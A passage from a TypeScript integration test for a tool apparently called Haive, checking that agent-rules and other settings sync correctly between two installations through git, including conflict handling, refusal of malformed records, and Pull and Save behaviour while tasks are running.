      const [syncA3, syncB3] = [await syncOnce(a), await syncOnce(b)];
      // R4 role swap: A answers take_theirs and its column becomes B’s value; a repeated sync asks nothing new.
      check(
        'T119 R4 role swap: A answers take_theirs: its column becomes B’s value, nothing new is asked on either install and .haive-data/state/ is byte-identical',
        took3.kind === 'resolved' &&
          afterTake3 !== null &&
          afterTake3.open.length === 0 &&
          afterTake3.all[0]!.resolution === 'take_theirs' &&
          (await ruleCol(a)) === Y3 &&
          (await ruleFile(a)) === Y3 &&
          syncA3.outcome === 'unchanged' &&
          syncB3.outcome === 'unchanged' &&
          (await questionsOf(b))?.open.length === 0 &&
          (await treesDiffer(a, b)).length === 0,
        { took3, afterTake3, syncA3, syncB3, trees: await treesDiffer(a, b) },
      );
      await applyRegion(a);
      pushFrom(a, 'A: the rules region for the value both hold', 'AGENTS.md', '.haive-data/state');
      await refresh(b, 'storage-b');
      const planB3 = await planOnly(b);
      const wantY3 = regionOfBlock(Y3);
      // R4: after the answers, the value both hold renders into both regions, and B has nothing to offer.
      check(
        'T119 R4: after the answers and A’s upgrade, both regions carry the value both hold and B’s plan is quiet for AGENTS.md',
        wantY3 !== null &&
          (await regionIn(a)) === wantY3 &&
          (await regionIn(b)) === wantY3 &&
          planB3.plan !== null &&
          isDeepStrictEqual(bucketsOf(planB3.plan), ['unchanged']),
        { a: await regionIn(a), b: await regionIn(b), buckets: bucketsOf(planB3.plan) },
      );

      // R5a: a checkout file with the same value, CRLF and no trailing newline, is tidied and never asked about.
      const crlfY3 = Y3.replace(/\n+$/, '').replace(/\n/g, '\r\n');
      const asked5a = (await questionsOf(b))?.all.length;
      await writeFile(path.join(b.repoPath, RULES_REL), crlfY3);
      const synced5a = await syncOnce(b);
      await sweepOnce(b);
      check(
        'T119 R5a: a checkout .md with the same value in CRLF and with no trailing newline is canonicalised by one sync and sweep, with no conflict',
        ['unchanged', 'applied'].includes(synced5a.outcome) &&
          (await ruleFile(b)) === Y3 &&
          (await ruleCol(b)) === Y3 &&
          (await questionsOf(b))?.all.length === asked5a &&
          (await openUnitsOf(b))?.length === 0 &&
          statusOn(b, RULES_REL) === '',
        { synced5a, file: await ruleFile(b), asked: await questionsOf(b), asked5a },
      );

      // R5b: one line of seven = in the .md refuses the whole record, whatever else it holds, until it is fixed.
      const SCOPE_REL = '.haive-data/state/settings/scope-exclude-globs.json';
      const portableColumns = (install: Install) =>
        rowsOf<Record<string, unknown>>(
          install.db,
          sql`select scope_exclude_globs, rtk_enabled, rtk_version, lsp_servers, lsp_server_versions, chrome_devtools_mcp_version, review_dimensions, agent_rules_override, render_context, onboarding_tooling, onboarding_environment from repositories where id = ${install.repositoryId}`,
        );
      const columnsBefore5b = await portableColumns(b);
      await writeFile(path.join(b.repoPath, RULES_REL), 'Rules heading\n=======\n- a rule\n');
      await writeFile(path.join(b.repoPath, SCOPE_REL), '[\n  "only-in-a-refused-record"\n]\n');
      const refused5b = await syncOnce(b);
      const error5b = await syncErrorOf(b);
      const columnsDuring5b = await portableColumns(b);
      // R5b: the refusal is of the whole record: the valid exclusion change beside the bad .md stays out of the columns, and the sync row says why.
      check(
        'T119 R5b: a checkout .md with a line of exactly seven = refuses the whole record: the sync row holds an open last_error and no column moves, not even for the valid exclusion change in the same record',
        refused5b.outcome === 'refused' &&
          typeof error5b === 'string' &&
          error5b !== '' &&
          'rows' in columnsBefore5b &&
          'rows' in columnsDuring5b &&
          columnsBefore5b.rows.length === 1 &&
          isDeepStrictEqual(columnsDuring5b.rows, columnsBefore5b.rows),
        { refused5b, error5b, columnsBefore5b, columnsDuring5b },
      );
      git(b.repoPath, 'checkout', '--', RULES_REL);
      const recovered5b = await syncOnce(b);
      const scopeAfterFix = await rowsOf<{ scope_exclude_globs: string[] | null }>(
        b.db,
        sql`select scope_exclude_globs from repositories where id = ${b.repositoryId}`,
      );
      // R5b: with only the .md fixed, the record is accepted whole and the exclusion change it held back imports, so it was importable all along.
      check(
        'T119 R5b: once the .md is fixed the next sync accepts the whole record again: last_error clears and the exclusion change held back before now imports',
        recovered5b.outcome === 'applied' &&
          (await syncErrorOf(b)) === null &&
          'rows' in scopeAfterFix &&
          isDeepStrictEqual(scopeAfterFix.rows[0]?.scope_exclude_globs, [
            'only-in-a-refused-record',
          ]) &&
          (await ruleCol(b)) === Y3 &&
          (await ruleFile(b)) === Y3,
        { recovered5b, error: await syncErrorOf(b), scopeAfterFix },
      );
      git(b.repoPath, 'checkout', '--', SCOPE_REL);
      const restored5b = await syncOnce(b);
      const columnsAfter5b = await portableColumns(b);
      // R5b: putting the exclusion file back puts the column back, so every column is as it was before the hazard.
      check(
        'T119 R5b: and putting the exclusion file back as committed puts every column back as it was before the hazard',
        restored5b.outcome === 'applied' &&
          'rows' in columnsBefore5b &&
          'rows' in columnsAfter5b &&
          isDeepStrictEqual(columnsAfter5b.rows, columnsBefore5b.rows) &&
          statusOn(b, RULES_REL, SCOPE_REL) === '',
        { restored5b, columnsBefore5b, columnsAfter5b, status: statusOn(b, RULES_REL, SCOPE_REL) },
      );

      // R5c: only settings/agent-rules.md is the setting’s file; a JSON file beside it is not read and not touched.
      const PLANTED_REL = '.haive-data/state/settings/agent-rules.json';
      const PLANTED = '"rules planted in a JSON file\\n"\n';
      await writeFile(path.join(b.repoPath, PLANTED_REL), PLANTED);
      const synced5c = await syncOnce(b);
      await sweepOnce(b);
      check(
        'T119 R5c: a planted settings/agent-rules.json beside the .md never wins and is left byte-identical',
        synced5c.outcome !== 'refused' &&
          (await ruleCol(b)) === Y3 &&
          (await ruleFile(b)) === Y3 &&
          (await readFile(path.join(b.repoPath, PLANTED_REL), 'utf8').catch(() => null)) ===
            PLANTED &&
          (await openUnitsOf(b))?.length === 0,
        { synced5c, column: await ruleCol(b), planted: await ruleFile(b) },
      );
      await rm(path.join(b.repoPath, PLANTED_REL));

      // R5d: extends the existing exclusion-list round trip (B1.8b, "B's exclusion list equals the one A edited"): the same JSON setting still travels, now beside the raw-text one.
      const scopeR5 = [...scopeEdited, 't119-r5d/**'].sort();
      await setScope(scopeR5);
      await sweepDirtyProjectStates(a.db);
      pushFrom(a, 'A: the exclusion list beside the rules file', '.haive-data/state');
      await refresh(b, 'storage-b');
      const scopeOnB5 = await rowsOf<{ scope_exclude_globs: string[] | null }>(
        b.db,
        sql`select scope_exclude_globs from repositories where id = ${b.repositoryId}`,
      );
      check(
        'T119 R5d: the generic JSON settings still round trip: A’s exclusion list reaches B through git beside the rules file, which is undisturbed',
        'rows' in scopeOnB5 &&
          isDeepStrictEqual(scopeOnB5.rows[0]?.scope_exclude_globs, scopeR5) &&
          (await ruleCol(b)) === Y3 &&
          (await ruleFile(b)) === Y3 &&
          (await treesDiffer(a, b)).length === 0,
        { scopeOnB5, column: await ruleCol(b), trees: await treesDiffer(a, b) },
      );

      // R6: a region an older release rendered from a user’s personal rules is Haive’s to replace, unless it was edited since.
      await setRules(b, null);
      await sweepDirtyProjectStates(b.db);
      const personal = buildCliRulesBlock(['- a personal rule\n'])!;
      const agentsNow = await agentsOf(b);
      const regionNow = extractRegion(agentsNow, CLI_RULES_START, CLI_RULES_END);
      const personalFile = `Unrelated line before the region.\n\n${agentsNow.replace(regionNow ?? '', personal.trimEnd())}Unrelated line after the region.\n`;
      await writeFile(path.join(b.repoPath, 'AGENTS.md'), personalFile);
      const [r6Task] = await b.db
        .insert(schema.tasks)
        .values({
          userId: b.userId,
          repositoryId: b.repositoryId,
          type: 'onboarding_upgrade',
          title: 'two-install-smoke R6',
          status: 'completed',
          completedAt: new Date(),
        })
        .returning({ id: schema.tasks.id });
      /** The live ledger row of the region, as an earlier release wrote it from `block`. */
      const recordRegionAs = (block: string) => {
        const hash = sha256Hex(normalizeContent(block));
        return b.db
          .update(schema.onboardingArtifacts)
          .set({
            taskId: r6Task!.id,
            source: 'upgrade',
            sourceStepId: '02-upgrade-apply',
            importedAt: null,
            templateContentHash: hash,
            writtenHash: hash,
            writtenContent: block,
            lastObservedDiskHash: hash,
            userModified: false,
          })
          .where(
            and(
              eq(schema.onboardingArtifacts.repositoryId, b.repositoryId),
              eq(schema.onboardingArtifacts.diskPath, CLI_RULES_DISK_PATH),
              eq(schema.onboardingArtifacts.templateKind, CLI_RULES_TEMPLATE_KIND),
              isNull(schema.onboardingArtifacts.supersededAt),
            ),
          )
          .returning({ id: schema.onboardingArtifacts.id });
      };
      const recorded6 = await recordRegionAs(personal);
      const planB6 = await planOnly(b);
      // R6: the fixture is what an old release left (a live row whose hash is the region, text around it), and the plan calls it a clean update.
      check(
        'T119 R6: B’s plan classifies a region rendered from personal rules, with a live ledger row whose written hash is that region, as a clean update',
        regionNow !== null &&
          recorded6.length === 1 &&
          (await regionIn(b)) === normalizeContent(personal) &&
          planB6.plan !== null &&
          isDeepStrictEqual(bucketsOf(planB6.plan), ['clean_update']),
        planB6.error ?? { recorded6, buckets: bucketsOf(planB6.plan), region: await regionIn(b) },
      );
      const agentsBefore6 = await agentsOf(b);
      const applied6 = await applyRegion(b);
      const agentsAfter6 = await agentsOf(b);
      // R6: applying it writes the repository-level block and leaves the lines around the region.
      check(
        'T119 R6: applying it writes buildRepoCliRulesBlock(null) and leaves the surrounding lines',
        applied6.error === null &&
          regionOf(agentsAfter6) === regionOfBlock(null) &&
          (regionOf(agentsAfter6) ?? '').includes(defaultFirstLine) &&
          !(regionOf(agentsAfter6) ?? '').includes('- a personal rule') &&
          outsideRegion(agentsAfter6) === outsideRegion(agentsBefore6) &&
          agentsAfter6.startsWith('Unrelated line before the region.\n') &&
          agentsAfter6.endsWith('Unrelated line after the region.\n'),
        {
          error: applied6.error,
          ...departure(regionOf(agentsAfter6), regionOfBlock(null) ?? ''),
          outsideKept: outsideRegion(agentsAfter6) === outsideRegion(agentsBefore6),
        },
      );
      const edited = buildCliRulesBlock(['- a personal rule\n', '- edited by hand\n'])!;
      await writeFile(
        path.join(b.repoPath, 'AGENTS.md'),
        agentsAfter6.replace(
          extractRegion(agentsAfter6, CLI_RULES_START, CLI_RULES_END) ?? '',
          edited.trimEnd(),
        ),
      );
      const recordedEdited = await recordRegionAs(personal);
      const planB6c = await planOnly(b);
      const agentsBefore6c = await readFile(path.join(b.repoPath, 'AGENTS.md'), 'utf8');
      const applied6c = await applyRegion(b);
      const agentsAfter6c = await readFile(path.join(b.repoPath, 'AGENTS.md'), 'utf8');
      // R6: the same fixture with the region edited after its row was written is a conflict, and the defaults leave the file alone.
      check(
        'T119 R6: the same with the region hand-edited after the row was written is a conflict, and applying with the defaults leaves AGENTS.md byte-identical',
        recordedEdited.length === 1 &&
          planB6c.plan !== null &&
          isDeepStrictEqual(bucketsOf(planB6c.plan), ['conflict']) &&
          applied6c.error === null &&
          agentsAfter6c === agentsBefore6c &&
          regionOf(agentsAfter6c) === normalizeContent(edited),
        planB6c.error ?? { buckets: bucketsOf(planB6c.plan), error: applied6c.error },
      );

      // R7a: a repository whose override is set before its first onboarding runs: 07 writes the region from it, 12 records it, the commit carries the file.
      const origin7 = path.join(tmp!, 'r7-origin.git');
      git(tmp!, 'init', '-q', '--bare', '-b', 'main', origin7);
      const seed7 = path.join(tmp!, 'r7-seed');
      git(tmp!, 'clone', '-q', httpOrigin(origin7), seed7);
      await writeFile(path.join(seed7, 'README.md'), '# two-install smoke, first onboarding\n');
      await writeFile(
        path.join(seed7, 'composer.json'),
        `${JSON.stringify({ name: 'acme/two-install', require: { 'drupal/core-recommended': '^10.3' } }, null, 2)}\n`,
      );
      git(seed7, 'add', 'README.md', 'composer.json');
      git(seed7, 'commit', '-q', '-m', 'seed');
      git(seed7, 'push', '-q', 'origin', 'HEAD:main');
      const userC = randomUUID();
      landUsers.push(userC);
      const c = await cloneInstall(
        'A',
        dbA!,
        path.join(tmp!, 'storage-r7'),
        httpOrigin(origin7),
        userC,
        A_PROVIDERS,
      );
      const OVERRIDE_C =
        '# Rules set before the first onboarding\n\n- Held by the repository from the start.\n';
      await setRules(c, OVERRIDE_C);
      const [onboardingC] = await c.db
        .insert(schema.tasks)
        .values({
          userId: c.userId,
          repositoryId: c.repositoryId,
          type: 'onboarding',
          title: 'two-install-smoke R7',
          status: 'running',
        })
        .returning({ id: schema.tasks.id });
      const chainC = [
        envDetectStep,
        detectionConfirmationStep,
        toolingInfrastructureStep,
        agentDiscoveryStep,
        generateFilesStep,
        postOnboardingStep,
      ] as const;
      const rowsC = await c.db
        .insert(schema.taskSteps)
        .values(
          chainC.map((step) => ({
            taskId: onboardingC!.id,
            stepId: step.metadata.id,
            stepIndex: step.metadata.index,
            title: step.metadata.title,
            status: 'pending' as const,
          })),
        )
        .returning({ id: schema.taskSteps.id, stepId: schema.taskSteps.stepId });
      const rowOfC = (step: (typeof chainC)[number]) =>
        rowsC.find((r) => r.stepId === step.metadata.id)!.id;
      await runStep(c, envDetectStep, onboardingC!.id, rowOfC(envDetectStep));
      await runStep(
        c,
        detectionConfirmationStep,
        onboardingC!.id,
        rowOfC(detectionConfirmationStep),
        {
          projectDescription: 'Two-install smoke fixture, first onboarding.',
        },
      );
      await runStep(
        c,
        toolingInfrastructureStep,
        onboardingC!.id,
        rowOfC(toolingInfrastructureStep),
        {
          ragMode: 'none',
          ollamaMode: 'external',
          ollamaUrl: 'http://only-on-c:11434',
          rtkEnabled: false,
        },
      );
      await runStep(
        c,
        agentDiscoveryStep,
        onboardingC!.id,
        rowOfC(agentDiscoveryStep),
        {},
        LLM_AGENTS,
      );
      await runStep(c, generateFilesStep, onboardingC!.id, rowOfC(generateFilesStep));
      const postedC = await runStep(
        c,
        postOnboardingStep,
        onboardingC!.id,
        rowOfC(postOnboardingStep),
        {
          commit: true,
        },
      );
      const regionC = await regionIn(c);
      const wantC = regionOfBlock(OVERRIDE_C);
      // R7a: 07 renders the region from the override the repository already held, not from the default or a personal rule.
      check(
        'T119 R7a: 07 writes the AGENTS.md rules region from the override the repository already held',
        wantC !== null &&
          regionC === wantC &&
          regionC.includes('- Held by the repository from the start.\n') &&
          !regionC.includes(defaultFirstLine),
        departure(regionC, wantC ?? ''),
      );
      const rowC = await c.db
        .select({
          writtenHash: schema.onboardingArtifacts.writtenHash,
          templateContentHash: schema.onboardingArtifacts.templateContentHash,
          source: schema.onboardingArtifacts.source,
        })
        .from(schema.onboardingArtifacts)
        .where(
          and(
            eq(schema.onboardingArtifacts.repositoryId, c.repositoryId),
            eq(schema.onboardingArtifacts.diskPath, CLI_RULES_DISK_PATH),
            eq(schema.onboardingArtifacts.templateKind, CLI_RULES_TEMPLATE_KIND),
            isNull(schema.onboardingArtifacts.supersededAt),
          ),
        );
      // R7a: 12 records the row from the region 07 wrote, so the row’s hash is the hash of the bytes on disk.
      check(
        'T119 R7a: 12 records the cli-rules row from the written region: its written hash equals that region’s hash',
        regionC !== null && rowC.length === 1 && rowC[0]!.writtenHash === sha256Hex(regionC),
        { rowC, region: regionC },
      );
      const inCommitC = git(
        c.repoPath,
        'diff-tree',
        '--no-commit-id',
        '--name-only',
        '-r',
        postedC.output.commitSha!,
      ).split('\n');
      // R7a: the onboarding commit carries the override as the record’s settings file.
      check(
        'T119 R7a: the onboarding commit contains .haive-data/state/settings/agent-rules.md, holding the normalised override',
        postedC.output.commitPerformed &&
          inCommitC.includes(RULES_REL) &&
          (await ruleFile(c)) === OVERRIDE_C &&
          (await ruleCol(c)) === OVERRIDE_C,
        { inCommitC, file: await ruleFile(c) },
      );

      // R7b: a fresh clone of a remote that already carries the file takes it as the column at clone time.
      const fresh = await cloneInstall(
        'B',
        dbB!,
        path.join(tmp!, 'storage-r7-fresh'),
        remoteUrl,
        undefined,
        B_PROVIDERS,
      );
      const freshError = await syncErrorOf(fresh);
      check(
        'T119 R7b: a fresh clone of the A and B remote, which carries settings/agent-rules.md, imports it as the column at clone time with no prior base',
        (await ruleFile(fresh)) === Y3 && (await ruleCol(fresh)) === Y3 && freshError === null,
        { file: await ruleFile(fresh), column: await ruleCol(fresh), freshError },
      );
      const planFresh = await planOnly(fresh);
      // R7b: the rules region reads unchanged, and the plan offers nothing the same clone did not offer before this block.
      check(
        'T119 R7b: and its first plan is quiet for the rules region and offers nothing the same remote did not offer before the rules were set',
        planFresh.plan !== null &&
          isDeepStrictEqual(bucketsOf(planFresh.plan), ['unchanged']) &&
          isDeepStrictEqual(noiseOf(planFresh.plan), baselineNoise),
        planFresh.error ?? { noise: noiseOf(planFresh.plan), baselineNoise },
      );
      // The repository of R7a, whose commit is consistent as a whole, pushed so that it can be cloned.
      git(c.repoPath, 'push', '-q', 'origin', 'HEAD:main');
      const freshC = await cloneInstall(
        'B',
        dbB!,
        path.join(tmp!, 'storage-r7-fresh-c'),
        httpOrigin(origin7),
        undefined,
        B_PROVIDERS,
      );
      const planFreshC = await planOnly(freshC);
      const notQuietC = (planFreshC.plan?.entries ?? [])
        .filter((e) => e.bucket !== 'unchanged')
        .map((e) => `${e.diskPath}: ${e.bucket}`);
      // R7b: a clone of a remote that is consistent as a whole imports the override and has nothing at all to be offered.
      check(
        'T119 R7b: a fresh clone of a consistent remote imports the override at clone time and its first plan is quiet throughout',
        (await ruleCol(freshC)) === OVERRIDE_C &&
          (await syncErrorOf(freshC)) === null &&
          planFreshC.plan !== null &&
          planFreshC.plan.entries.length > 0 &&
          notQuietC.length === 0 &&
          isDeepStrictEqual(bucketsOf(planFreshC.plan), ['unchanged']),
        planFreshC.error ?? { column: await ruleCol(freshC), notQuietC },
      );
    }

    // T120: explicit Haive data Save carries both projections, including a landed union.
    {
      const { x, y, origin } = await landing('t120-data-save');
      // Save on A runs in another worker process, as a second installation does: getDb is
      // process-local and the queue-driven cases below intentionally keep this process on B.
      const saveOnA = (): HaiveDataSaveResult => {
        const script = `
          import { initDatabase } from ${JSON.stringify(new URL('../src/db.ts', import.meta.url).href)};
          import { saveHaiveData } from ${JSON.stringify(new URL('../src/project-state/save.ts', import.meta.url).href)};
          const db = initDatabase(process.env.DATABASE_URL);
          try {
            const result = await saveHaiveData(JSON.parse(process.env.HAIVE_DATA_SAVE_SMOKE_PAYLOAD));
            console.log('HAIVE_DATA_SAVE_RESULT=' + JSON.stringify(result));
          } finally { await db.$client.end({ timeout: 5 }); }
        `;
        const output = execFileSync(
          'node',
          ['--import', 'tsx', '--input-type=module', '--eval', script],
          {
            env: {
              ...process.env,
              DATABASE_URL: urlA,
              HAIVE_DATA_SAVE_SMOKE_PAYLOAD: JSON.stringify({
                repositoryId: x.repositoryId,
                userId: x.userId,
                push: true,
              }),
            },
            encoding: 'utf8',
            timeout: 60_000,
          },
        );
        const line = output.split('\n').find((item) => item.startsWith('HAIVE_DATA_SAVE_RESULT='));
        if (!line) throw new Error('A returned no Haive data Save result');
        return JSON.parse(line.slice('HAIVE_DATA_SAVE_RESULT='.length)) as HaiveDataSaveResult;
      };
      await setRender(x, { acceptedAgentIds: ['a', 'b'] });
      await editPlan(x, 1, 'T120 plan on A');
      const sent = saveOnA();
      const picked = await pull({ repositoryId: y.repositoryId, userId: y.userId });
      check(
        'T120: A saves and pushes its record and plan in one commit; B picks both up',
        sent.committed &&
          sent.pushed &&
          sent.refusal === null &&
          sent.files.includes(RECORD_RENDER) &&
          sent.files.includes(planFileRel) &&
          picked.pulled?.fastForwarded === true &&
          isDeepStrictEqual((await columnOf(y))?.acceptedAgentIds, ['a', 'b']) &&
          (await titlesOf(y)).includes('T120 plan on A'),
        { sent, picked },
      );

      await setRender(y, { acceptedAgentIds: ['a', 'b'], lspLanguages: ['php'] });
      await editPlan(y, 0, 'T120 plan on B');
      await setRender(x, { acceptedAgentIds: ['a', 'b', 'c'] });
      await editPlan(x, 1, 'T120 latest on A');
      saveOnA();
      const merged = await (
        await import('../src/project-state/save.js')
      ).saveHaiveData({ repositoryId: y.repositoryId, userId: y.userId, push: true });
      const remote = JSON.parse(git(origin, 'show', `main:${RECORD_RENDER}`)) as Render;
      const remotePlan = git(origin, 'show', `main:${planFileRel}`);
      check(
        'T120: a landed Haive data Save pushes the union record and both plan edits',
        merged.pushed &&
          merged.refusal === null &&
          git(origin, 'rev-parse', 'main') === git(y.repoPath, 'rev-parse', 'HEAD') &&
          isDeepStrictEqual(remote?.acceptedAgentIds, ['a', 'b', 'c']) &&
          isDeepStrictEqual(remote?.lspLanguages, ['php']) &&
          remotePlan.includes('T120 latest on A') &&
          remotePlan.includes('T120 plan on B') &&
          dirtyOn(y) === '',
        { merged, remote, dirty: dirtyOn(y) },
      );
    }

    // C3: a Pull lands past the files Haive wrote, and B's pending changes survive.
    {
      const { x, y } = await landing('c3');
      await setRender(y, { lspLanguages: ['php'] });
      await editPlan(y, 0, 'Edited on B');
      await writePlanMirror(y.db, y.repositoryId, y.repoPath);
      await setRender(x, { acceptedAgentIds: ['a', 'b'] });
      await editPlan(x, 1, 'Edited on A');
      await writePlanMirror(x.db, x.repositoryId, x.repoPath);
      const sent = pushFrom(
        x,
        'A: an agent and a plan edit',
        '.haive-data/state',
        planFileRel,
        planMdRel,
      );
      const dirty = dirtyOn(y);
      check(
        'C3: B holds a render change and a plan edit Haive wrote and has not committed',
        dirty.includes(RECORD_RENDER) && dirty.includes(planFileRel),
        dirty.split('\n'),
      );
      const pulled = await attempt(() => pull({ repositoryId: y.repositoryId, userId: y.userId }));
      check(
        'C3: a Pull lands the commit A pushed past the files Haive wrote',
        pulled.error === null && contains(y, sent) && pulled.value?.pulled?.fastForwarded === true,
        { error: pulled.error, pulled: pulled.value?.pulled },
      );
      const titles = await titlesOf(y);
      const planText = await fileOf(y, planFileRel);
      check(
        "C3: and B's pending render change and plan edit survive beside A's, in its database and on disk",
        (await holdsBoth(y)) &&
          titles.includes('Edited on A') &&
          titles.includes('Edited on B') &&
          planText.includes('Edited on A') &&
          planText.includes('Edited on B'),
        { column: await columnOf(y), titles, status: dirtyOn(y).split('\n') },
      );
    }

    // C4: a Save & push lands past the files Haive wrote, pushes, and B's pending change survives.
    {
      const { x, y, origin } = await landing('c4');
      await setRender(y, { lspLanguages: ['php'] });
      await editPlan(y, 0, 'Edited on B');
      await setRender(x, { acceptedAgentIds: ['a', 'b'] });
      const sent = pushFrom(x, 'A: an agent', '.haive-data/state');
      check(
        'C4: B holds a render change Haive wrote and has not committed, and a plan edit to save',
        dirtyOn(y).includes(RECORD_RENDER),
        dirtyOn(y).split('\n'),
      );
      const saved = await attempt(() =>
        save({ repositoryId: y.repositoryId, userId: y.userId, push: true }),
      );
      const tip = git(origin, 'rev-parse', 'main');
      check(
        'C4: a Save & push lands the commit A pushed past the file Haive wrote, and pushes',
        saved.error === null &&
          saved.value?.pushed === true &&
          tip === git(y.repoPath, 'rev-parse', 'HEAD') &&
          tip !== sent &&
          git(origin, 'show', 'main:.haive-data/plan.json').includes('Edited on B'),
        { error: saved.error, tip, sent },
      );
      check(
        "C4: and B's pending render change survives beside A's, in its database and on disk",
        await holdsBoth(y),
        { column: await columnOf(y), status: dirtyOn(y).split('\n') },
      );
    }

    // C5: 01's confirm lands past the files Haive wrote while its own task is live, and pushes.
    {
      const { x, y, origin } = await landing('c5');
      await setRender(y, { lspLanguages: ['php'] });
      await writeFile(path.join(y.repoPath, 'b-local.txt'), 'b\n');
      git(y.repoPath, 'add', 'b-local.txt');
      git(y.repoPath, 'commit', '-q', '-m', 'B: a local commit');
      await setRender(x, { acceptedAgentIds: ['a', 'b'] });
      pushFrom(x, 'A: an agent', '.haive-data/state');
      const { ctx, detect } = await conversation(y);
      const confirmed = await attempt(async () => confirm(ctx, await detect()));
      check(
        "C5: 01's confirm lands the merge past the file Haive wrote, and pushes it",
        confirmed.error === null &&
          confirmed.value?.landed === true &&
          confirmed.value.pushed === true &&
          git(origin, 'rev-parse', 'main') === git(y.repoPath, 'rev-parse', 'HEAD'),
        confirmed.error ?? confirmed.value,
      );
      check(
        "C5: and B's pending render change survives beside A's, in its database and on disk",
        await holdsBoth(y),
        { column: await columnOf(y), status: dirtyOn(y).split('\n') },
      );
    }

    // C16: 01's confirm is refused while another task works in the checkout, found on a clean tree, a dirty one, or after the set-aside.
    for (const shape of ['clean', 'dirty', 'late'] as const) {
      const { x, y } = await landing(`c16-${shape}`);
      if (shape !== 'clean') await setRender(y, { lspLanguages: ['php'] });
      await writeFile(path.join(y.repoPath, 'b-local.txt'), 'b\n');
      git(y.repoPath, 'add', 'b-local.txt');
      git(y.repoPath, 'commit', '-q', '-m', 'B: a local commit');
      await setRender(x, { acceptedAgentIds: ['a', 'b'] });
      pushFrom(x, 'A: an agent', '.haive-data/state');
      const { ctx, detect } = await conversation(y);
      const started: string[] = [];
      let restores = 0;
      const startOther = async () => {
        if (started.length > 0) return;
        const [row] = await y.db
          .insert(schema.tasks)
          .values({
            userId: y.userId,
            repositoryId: y.repositoryId,
            type: 'onboarding',
            title: 'two-install-smoke',
            status: 'running',
          })
          .returning({ id: schema.tasks.id });
        started.push(row!.id);
      };
      try {
        restoreFaults.beforeRestore = () => {
          restores += 1;
        };
        if (shape === 'late') restoreFaults.afterRestore = startOther;
        else await startOther();
        const head = git(y.repoPath, 'rev-parse', 'HEAD');
        const status = dirtyOn(y);
        const pending = await fileOf(y, RECORD_RENDER);
        const confirmed = await attempt(async () => confirm(ctx, await detect()));
        check(
          `C16: 01's confirm is refused while another task works in the checkout (${shape}), and the checkout does not move`,
          started.length === 1 &&
            confirmed.error === null &&
            confirmed.value?.landed === false &&
            confirmed.value.continueRequested === true &&
            confirmed.value.summary.startsWith('Refused:') &&
            confirmed.value.summary.includes('working in this checkout') &&
            git(y.repoPath, 'rev-parse', 'HEAD') === head,
          confirmed.error ?? confirmed.value,
        );
        check(
          `C16: and the files Haive wrote are back on disk as they were (${shape})`,
          (shape === 'clean' || status.includes(RECORD_RENDER)) &&
            (await fileOf(y, RECORD_RENDER)) === pending &&
            dirtyOn(y) === status,
          { before: status.split('\n'), after: dirtyOn(y).split('\n') },
        );
        check(
          `C16: and they were set aside only when the task started after (${shape})`,
          restores === (shape === 'late' ? 1 : 0),
          { restores },
        );
      } finally {
        delete restoreFaults.beforeRestore;
        delete restoreFaults.afterRestore;
        for (const id of started) await y.db.delete(schema.tasks).where(eq(schema.tasks.id, id));
      }
    }

    // C6: a Pull refuses a state file Haive did not write, naming it, and nothing moves.
    {
      const { x, y } = await landing('c6');
      await setRender(x, { acceptedAgentIds: ['a', 'b'] });
      pushFrom(x, 'A: an agent', '.haive-data/state');
      const head = git(y.repoPath, 'rev-parse', 'HEAD');
      await writeFile(path.join(y.repoPath, RECORD_RENDER), '{ edited by hand');
      const pulled = await attempt(() => pull({ repositoryId: y.repositoryId, userId: y.userId }));
      check(
        'C6: a Pull refuses a state file edited by hand, naming it, and the checkout does not move',
        pulled.error !== null &&
          pulled.error.includes(RECORD_RENDER) &&
          git(y.repoPath, 'rev-parse', 'HEAD') === head &&
          (await fileOf(y, RECORD_RENDER)) === '{ edited by hand',
        pulled.error,
      );
    }

    // C7: a Save & push is refused while a task holds the checkout, on a clean tree and on a dirty one.
    for (const dirtyTree of [false, true]) {
      const label = dirtyTree ? 'c7b' : 'c7';
      const { x, y, origin } = await landing(label);
      await editPlan(y, 0, 'Edited on B');
      if (dirtyTree) await setRender(y, { lspLanguages: ['php'] });
      await setRender(x, { acceptedAgentIds: ['a', 'b'] });
      const sent = pushFrom(x, 'A: an agent', '.haive-data/state');
      await y.db.insert(schema.tasks).values({
        userId: y.userId,
        repositoryId: y.repositoryId,
        type: 'workflow',
        title: 'two-install-smoke',
        status: 'running',
      });
      const before = dirtyOn(y);
      const saved = await attempt(() =>
        save({ repositoryId: y.repositoryId, userId: y.userId, push: true }),
      );
      check(
        `${label.toUpperCase()}: a Save & push is refused while a task holds a ${dirtyTree ? 'dirty' : 'clean'} checkout, and nothing is pushed`,
        saved.error !== null &&
          saved.error.includes('task in flight') &&
          saved.error.includes('nothing was pushed') &&
          git(origin, 'rev-parse', 'main') === sent &&
          (!dirtyTree || (dirtyOn(y).includes(RECORD_RENDER) && before.includes(RECORD_RENDER))),
        { error: saved.error, status: dirtyOn(y).split('\n') },
      );
    }

    // C8: a fast-forward git refuses over a local change says so, not that the checkout moved.
    {
      const origin = path.join(tmp!, 'land-c8.git');
      git(tmp!, 'init', '-q', '--bare', '-b', 'main', origin);
      const remote = path.join(tmp!, 'land-c8-remote');
      const local = path.join(tmp!, 'land-c8-local');
      git(tmp!, 'clone', '-q', httpOrigin(origin), remote);
      await writeFile(path.join(remote, 'README.md'), 'one\n');
      git(remote, 'add', 'README.md');
      git(remote, 'commit', '-q', '-m', 'seed');
      git(remote, 'push', '-q', 'origin', 'HEAD:main');
      git(tmp!, 'clone', '-q', httpOrigin(origin), local);
      await writeFile(path.join(remote, 'README.md'), 'two\n');
      git(remote, 'commit', '-q', '-am', 'edit');
      git(remote, 'push', '-q', 'origin', 'HEAD:main');
      git(local, 'fetch', '-q', 'origin');
      await writeFile(path.join(local, 'README.md'), 'mine\n');
      const landed = await attempt(() =>
        landPlanMerge(local, git(local, 'rev-parse', 'origin/main')),
      );
      check(
        'C8: landing over a local change says the checkout has uncommitted changes, naming the file',
        landed.error !== null &&
          landed.error.includes('uncommitted changes') &&
          landed.error.includes('README.md'),
        landed.error,
      );
    }

    // C9: a file Haive rewrites while a Pull waits for the merge lock sends the move round again.
    {
      const { x, y } = await landing('c9');
      await setRender(y, { lspLanguages: ['php'] });
      await setRender(x, { acceptedAgentIds: ['a', 'b'] });
      const sent = pushFrom(x, 'A: an agent', '.haive-data/state');
      const waited = await rewrittenWhileWaiting(y, () =>
        attempt(() => pull({ repositoryId: y.repositoryId, userId: y.userId })),
      );
      check(
        'C9: a sweep rewrote the record file between the Pull setting it aside and moving',
        waited.blocked && waited.rewritten.includes(RECORD_RENDER),
        waited,
      );
      check(
